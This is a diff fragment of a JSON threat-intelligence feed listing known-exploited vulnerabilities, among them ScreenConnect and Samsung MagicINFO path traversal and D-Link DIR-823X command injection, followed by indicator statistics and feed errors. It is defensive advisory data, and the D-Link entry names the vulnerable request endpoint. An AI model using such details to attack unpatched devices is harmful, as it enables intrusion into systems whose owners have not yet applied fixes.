+      "due_date": "2026-05-03",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Known"
+    },
+    {
+      "cve_id": "CVE-2024-1708",
+      "vendor": "ConnectWise",
+      "product": "ScreenConnect",
+      "name": "ConnectWise ScreenConnect Path Traversal Vulnerability",
+      "description": "ConnectWise ScreenConnect contains a path traversal vulnerability which could allow an attacker to execute remote code or directly impact confidential data and critical systems.",
+      "date_added": "2026-04-28",
+      "due_date": "2026-05-12",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Known"
+    },
+    {
+      "cve_id": "CVE-2026-32202",
+      "vendor": "Microsoft",
+      "product": "Windows",
+      "name": "Microsoft Windows Protection Mechanism Failure Vulnerability",
+      "description": "Microsoft Windows Shell contains a protection mechanism failure vulnerability that allows an unauthorized attacker to perform spoofing over a network.",
+      "date_added": "2026-04-28",
+      "due_date": "2026-05-12",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2025-29635",
+      "vendor": "D-Link",
+      "product": "DIR-823X",
+      "name": "D-Link DIR-823X Command Injection Vulnerability",
+      "description": "D-Link DIR-823X contains a command injection vulnerability that allows an authorized attacker to execute arbitrary commands on remote devices by sending a POST request to /goform/set_prohibiting via the corresponding function. The impacted product could be end-of-life (EoL) and/or end-of-service (EoS). Users should discontinue product utilization.",
+      "date_added": "2026-04-24",
+      "due_date": "2026-05-08",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2024-7399",
+      "vendor": "Samsung",
+      "product": "MagicINFO 9 Server",
+      "name": "Samsung MagicINFO 9 Server Path Traversal Vulnerability",
+      "description": "Samsung MagicINFO 9 Server contains a path traversal vulnerability that could allow an attacker to write arbitrary files as system authority.",
+      "date_added": "2026-04-24",
+      "due_date": "2026-05-08",
+      "required_action": "Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.",
+      "known_ransomware": "Unknown"
+    }
+  ],
+  "stats": {
+    "total_structured": 355,
+    "total_extracted": 41,
+    "total": 396,
+    "by_type": {
+      "ip": 218,
+      "url": 150,
+      "sha256": 14,
+      "cve": 7,
+      "md5": 7
+    },
+    "by_source": {
+      "URLhaus": 150,
+      "Emerging Threats": 100,
+      "Binary Defense": 100,
+      "Cisco Talos": 13,
+      "Unit 42": 7,
+      "Kaspersky Securelist": 7,
+      "Trend Micro": 7,
+      "Unit 42 (GitHub)": 7,
+      "Feodo Tracker": 5
+    }
+  },
+  "errors": [
+    "[threatfox]: HTTP Error 401: Unauthorized",
+    "[c2tracker/Cobalt Strike C2]: HTTP Error 404: Not Found",
+    "[c2tracker/Sliver C2]: HTTP Error 404: Not Found",
+    "[c2tracker/Metasploit C2]: HTTP Error 404: Not Found",
+    "[c2tracker/Brute Ratel C4]: HTTP Error 404: Not Found",
+    "[blog_rss/Google TAG]: HTTP Error 404: Not Found",
+    "[blog_rss/FortiGuard]: HTTP Error 404: Not Found"
+  ]
+}
